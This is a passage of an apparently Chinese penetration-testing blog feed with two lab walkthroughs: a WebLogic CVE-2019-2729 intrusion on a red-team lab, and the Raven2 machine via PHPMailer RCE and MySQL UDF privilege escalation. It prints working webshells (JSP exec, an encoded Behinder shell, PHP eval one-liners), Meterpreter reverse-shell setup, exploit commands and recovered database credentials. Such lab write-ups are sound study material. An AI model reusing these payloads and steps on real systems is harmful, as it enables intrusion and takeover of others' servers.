class="line">|   number: 10.50.4000.00</span><br></pre></td></tr></table></figure><h2 id="weblogic版本"><a class="markdownIt-Anchor" href="#weblogic版本"></a> weblogic版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; </span><br></pre></td></tr></table></figure><h2 id="80端口信息"><a class="markdownIt-Anchor" href="#80端口信息"></a> 80端口信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open  http         Microsoft IIS httpd 7.5</span><br></pre></td></tr></table></figure><p>解析漏洞，没有看见网页（上传地址）没办法利用</p><h2 id="服务器信息"><a class="markdownIt-Anchor" href="#服务器信息"></a> 服务器信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows Server 2008 R2 - 2012 </span><br></pre></td></tr></table></figure><h2 id="其他端口信息"><a class="markdownIt-Anchor" href="#其他端口信息"></a> 其他端口信息</h2><p>135 通过135端口入侵实际上是利用RPC漏洞来攻击计算机的。一般情况下135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）</p><p>139 存在Samba服务，可能存在爆破/未授权访问/远程命令执行漏洞。他是NetBIOS Session Service设备提供的辅助端口，是用于提供Windows文件和打印机共享文件的重要连接方式</p><p>445 smb服务，可能存在ms17_010永恒之蓝漏洞。139和445存在，为ipc和smb的利用提供了条件。</p><h2 id="主机信息使用冰蝎看的"><a class="markdownIt-Anchor" href="#主机信息使用冰蝎看的"></a> 主机信息（使用冰蝎看的）</h2><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><p>主动防御</p><p>SQL Server</p><h3 id="正在运行"><a class="markdownIt-Anchor" href="#正在运行"></a> 正在运行</h3><p>sqlserver weblogic 360</p><h3 id="systeminfo"><a class="markdownIt-Anchor" href="#systeminfo"></a> systeminfo</h3><p>系统：Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601</p><p>名：WEB</p><p>所以搜集到两个网段：</p><ul><li>10.10.10.80</li><li>10.131.210.32</li></ul><p>补丁：</p><ul><li>KB2999226</li><li>KB958488</li><li>KB976902</li></ul><p>域：<a href="http://de1ay.com">de1ay.com</a></p><h1 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> Weblogic</h1><h2 id="weblogic-scan"><a class="markdownIt-Anchor" href="#weblogic-scan"></a> Weblogic scan</h2><p>这里有两个脚本，一个是原始的，不好用，探测不出来：</p><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><p>一个是修改过的，这个好用：</p><p><a href="https://github.com/dr0op/WeblogicScan">https://github.com/dr0op/WeblogicScan</a></p><p>还有个利用工具：</p><p><a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a></p><p>探测到的信息有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Welcome To WeblogicScan !!</span><br><span class="line">[*]开始检测 weblogic-console</span><br><span class="line">[+]The target Weblogic console address is exposed!</span><br><span class="line">[+]The path is: http://10.131.210.32:7001/console/login/LoginForm.jsp         </span><br><span class="line">[+]Please try weak password blasting!                                         </span><br><span class="line">[+]Weblogic后台路径存在</span><br><span class="line">[*]开始检测 SSRF</span><br><span class="line">[+]The target Weblogic UDDI module is exposed!</span><br><span class="line">[+]The path is: http://10.131.210.32:7001/uddiexplorer/                       </span><br><span class="line">[+]Please verify the SSRF vulnerability!                                                                            </span><br><span class="line">[+]SSRF 漏洞存在</span><br><span class="line">[*]开始检测 CVE20192725</span><br><span class="line">[-]CVE20192725 未成功检测，请检查网络连接或或目标存在负载中间件</span><br><span class="line">[*]开始检测 CVE20192729</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729</span><br><span class="line">[+]CVE-2019-2729 漏洞存在</span><br><span class="line">[*]开始检测 CVE201710271</span><br><span class="line">[-]Target weblogic not detected CVE-2017-10271</span><br><span class="line">[*]开始检测 CVE20173506</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506</span><br><span class="line">[+]CVE-2017-3506 漏洞存在</span><br></pre></td></tr></table></figure><ul><li><p>CVE-2019-2729 漏洞存在，这个是反序列化漏洞，可以执行RCE</p></li><li><p>CVE-2017-3506 漏洞存在，这个是wls-wsat组件远程命令执行，与2017-10271类似</p></li></ul><h2 id="利用cve-2019-2729"><a class="markdownIt-Anchor" href="#利用cve-2019-2729"></a> 利用CVE-2019-2729</h2><p><a href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~/Mywork/Tools/WeblogicScan/CVE-2019-2729-Exploit]</span><br><span class="line">└─$ python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c chdir</span><br><span class="line">[+] Send Request to : http://10.131.210.32:7001//wls-wsat/CoordinatorPortType</span><br><span class="line">[+] Response : C:\Oracle\Middleware\user_projects\domains\base_domain</span><br></pre></td></tr></table></figure><p>尝试写一个木马进去，或者反弹shell也行。尝试反弹shell不可行，放弃。写一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br></pre></td></tr></table></figure><p>看一下这个weblogic的目录结构，以及把文件放在哪里。经过<code>dir</code>和网上的类似资料，发现放在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war</span><br></pre></td></tr></table></figure><p>写进去，注意这里面<code>^</code>为转义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c &#x27;echo ^&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%^&gt; &gt; .\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell.jsp&#x27;</span><br></pre></td></tr></table></figure><p>然而不行，呵呵呵呵</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230705152442230.png" alt="image-20230705152442230" /></p><p>这个漏洞在<a href="http://10.131.210.32:7001/uddiexplorer/SearchPublicRegistries.jsp%E8%BF%99%E9%87%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E9%9D%A2%E7%9A%84operator%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%9A">http://10.131.210.32:7001/uddiexplorer/SearchPublicRegistries.jsp这里，这里面的operator我们可以利用：</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230705153152705.png" alt="image-20230705153152705" /></p><p>那么直接在msf上使用这个漏洞返回shell也不行，没返回session。尝试 base64 / hex 传一个冰蝎马吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c <span class="string">&#x27;echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7Lyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBcmViZXlvbmQqL3Nlc3Npb24ucHV0VmFsdWUoInUiLGspO0NpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoay5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7fSU+ &gt; .\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_b.jsp&#x27;</span></span><br><span class="line"></span><br><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c <span class="string">&#x27;certutil -f -decode C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_b.jsp C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_be.jsp&#x27;</span></span><br></pre></td></tr></table></figure><p>管用！连上了。</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230706154311007.png" alt="image-20230706154311007" /></p><p>多种方式进行会话维持</p><h2 id="冰蝎meterpreter连"><a class="markdownIt-Anchor" href="#冰蝎meterpreter连"></a> 冰蝎meterpreter连</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set payload java/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; java/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.131.210.172</span><br><span class="line">lhost =&gt; 10.131.210.172</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4445</span><br><span class="line">lport =&gt; 4445</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.131.210.172:4445 </span><br><span class="line">[*] Sending stage (58829 bytes) to 10.131.210.32</span><br><span class="line">[*] Meterpreter session 3 opened (10.131.210.172:4445 -&gt; 10.131.210.32:49950) at 2023-07-06 16:08:07 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>好吧，找另外一个漏洞：</p><blockquote><p>检查Payload：Weblogic10 HttpEchoShell1<br />[+]存在：CVE_2017_10271_ECHO漏洞，返回信息：de1ay\administrator</p></blockquote><p>上传冰蝎马，然后上传msf的木马反弹shell，然后上线cs，冲！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础环境设置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础环境设置&quot;&gt;&lt;/a&gt; 基础环境设置&lt;/h1&gt;
&lt;h2 id=&quot;主要练习&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#主要练习&quot;&gt;&lt;/a&gt; 主要</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>打靶-Raven2</title>
    <link href="https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/"/>
    <id>https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/</id>
    <published>2023-06-28T02:07:36.000Z</published>
    <updated>2023-06-28T02:07:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="资产搜索信息搜集"><a class="markdownIt-Anchor" href="#资产搜索信息搜集"></a> 资产搜索&amp;信息搜集</h1><p>先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~]</span><br><span class="line">└─$ sudo masscan 10.131.210.0/24 --ports 80</span><br><span class="line">[sudo] password for j3fffff: </span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-06-26 04:30:34 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 256 hosts [1 port/host]</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.39 这个才是</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.134 这个是Canon打印机     </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.9 H3Cwifi</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.1                       </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.59              </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.65 访问不了</span><br></pre></td></tr></table></figure><p>找到机器了，那么就访问网页，发现是这样的：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628133330474.png" alt="image-20230628133330474" /></p><p>还是用nmap扫一下，是linux系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -A -p- 10.131.210.39 </span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)</span><br><span class="line">|   2048 315801194da280a6b90d40981c97aa53 (RSA)</span><br><span class="line">|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)</span><br><span class="line">|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-title: Raven Security</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          37669/udp6  status</span><br><span class="line">|   100024  1          44486/udp   status</span><br><span class="line">|   100024  1          51551/tcp   status</span><br><span class="line">|_  100024  1          52741/tcp6  status</span><br><span class="line">51551/tcp open  status  1 (RPC #100024)</span><br></pre></td></tr></table></figure><p>使用burp抓包，随便点一下，发现一些URL：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628133849371.png" alt="image-20230628133849371" /></p><p>不够，再用dirb扫一下，发现目录：<code>vendor</code></p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628134010281.png" alt="image-20230628134010281" /></p><p>分别打开，<code>PATH</code>，内容有网站的目录以及一个flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure><p>再打开：<code>SECURITY、VERSION</code>，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## Version 5.2.17 (December 9th 2016)</span><br><span class="line">* This is officially the last feature release of 5.2. Security fixes only from now on; use PHPMailer 6.0!</span><br><span class="line"></span><br><span class="line">PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com).</span><br></pre></td></tr></table></figure><p>发现phpmail漏洞，上面有wordpress，使用wpscan扫一下，发现了upload目录，其他的好像没啥用：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628134946810.png" alt="image-20230628134946810" /></p><h1 id="phpmail漏洞rce-getshell"><a class="markdownIt-Anchor" href="#phpmail漏洞rce-getshell"></a> PHPMAIL漏洞RCE-getshell</h1><p>去找存在Phpmail的页面，一般存在于mail联系等，所以就是contact.php了。</p><p>发现使用这个<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a>没办法成功，所以换一个exp：<a href="https://www.exploit-db.com/download/40974">40974.py</a></p><p>更改一些配置，例如攻击的页面等，然后执行脚本，访问contact.php，再访问shell.php</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628100744698.png" alt="image-20230628100744698" /></p><p>弄好了就直接打</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628135427514.png" alt="image-20230628135427514" /></p><p>访问一下<code>contact.php</code>，他就生成shell，在msf开个监听，然后打开<code>10.131.210.39/shell.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">...</span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br></pre></td></tr></table></figure><p>设置一下LHOST即可，可以自己设置payload，现在用不到，等着返回，就可以拿到了shell，然后引入meterpreter进行后渗透</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use post/multi/manage/shell_to_meterpreter</span><br><span class="line">session 1</span><br></pre></td></tr></table></figure><p>成功，可以进行后渗透</p><h1 id="渗透提权"><a class="markdownIt-Anchor" href="#渗透提权"></a> 渗透提权</h1><p>先进行信息搜集，<a href="http://xn--LinEnum-fw3kw4f.sh">上传LinEnum.sh</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter# upload LinuEnum.sh /var/www/html/LinuEnum.sh</span><br></pre></td></tr></table></figure><p>扫一下，将至重定向到一个文件，看文件，发现存在Mysql：<code>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3</code>，好了，应该可以用它来提权，得先知道他的用户名密码，所以一顿查找：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name *config*</span><br><span class="line">/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php</span><br><span class="line">/var/www/html/wordpress/wp-admin/setup-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config-sample.php</span><br></pre></td></tr></table></figure><p>找到了，在<code>/var/www/html/wordpress/wp-config.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);</span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);</span><br></pre></td></tr></table></figure><p>用msf链接数据库，使用UDF提权试试看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: R@v3nSecurity</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| /usr      |</span><br><span class="line">+-----------+</span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@version       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 5.5.60-0+deb8u1 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p>下载UDF，编译一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -</span><br><span class="line">mv raptor_udf.so udf.so</span><br></pre></td></tr></table></figure><p>操作！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table ha4k(line blob);</span><br><span class="line">insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"># 输出恶意so</span><br><span class="line">select * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># 创建函数</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">&lt;mod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure><p>全部都OK，后面查找特权命令：<code>find / -user root -perm 4000 -print 2 &gt; /dev/null</code></p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png" alt="image-20230628124849070" /></p><p>OKOK，提权成功！</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628125028105.png" alt="image-20230628125028105" /></p><p>全局找Flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># find / -name flag*</span><br><span class="line">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br><span class="line"># cat /root/flag4.txt</span><br></pre></td></tr></table></figure><h1 id="备注"><a class="markdownIt-Anchor" href="#备注"></a> 备注</h1><h2 id="命令行写shell出错"><a class="markdownIt-Anchor" href="#命令行写shell出错"></a> 命令行写shell出错</h2><p>他是反弹shell，所以开启：<code>nc -lvp 4444</code>，接受到了，尝试写一个一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php</span><br></pre></td></tr></table></figure><p>发现了一些错误：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628101840177.png" alt="image-20230628101840177" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;&lt;?php eval($_GET[&#x27;Jeff&#x27;]);?&gt;&#x27; &gt; bdoor.php</span><br><span class="line">$ cat bdoor.php</span><br><span class="line">&lt;?php eval($_GET[Jeff]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php eval($_GET[\&#x27;Jeff\&#x27;]);?&gt;&#x27; &gt; bdoor.php     </span><br><span class="line">/bin/sh: 5: Syntax error: &quot;)&quot; unexpected</span><br><span class="line">$ echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php</span><br><span class="line">$ cat bdoor.php</span><br><span class="line">&lt;?php eval([&#x27;X&#x27;]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php @eval($_POST[\&#x27;h4ck\&#x27;]) ?&gt;&#x27; &gt; bdoor.php</span><br><span class="line">/bin/sh: 7: Syntax error: &quot;)&quot; unexpected</span><br><span class="line">$ cat bdoor.php </span><br><span class="line">&lt;?php eval([&#x27;X&#x27;]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class="line">$ cat 1.php</span><br><span class="line">&lt;?php eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure><p>需要转义</p><h2 id="小彩蛋"><a class="markdownIt-Anchor" href="#小彩蛋"></a> 小彩蛋</h2><p>发现里面有contact.zip，可以下下来，自己看看里面有啥，这也是思路</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;资产搜索信息搜集&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#资产搜索信息搜集&quot;&gt;&lt;/a&gt; 资产搜索&amp;amp;信息搜集&lt;/h1&gt;
&lt;p&gt;先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了：&lt;/p&gt;
&lt;fig</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="打靶" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="权限提升" scheme="https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="漏洞扫描" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>nacos复现</title>
    <link href="https://j3f5.github.io/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-06-26T12:22:04.000Z</published>
    <updated>2023-06-27T12:22:04.000Z</updated>
    
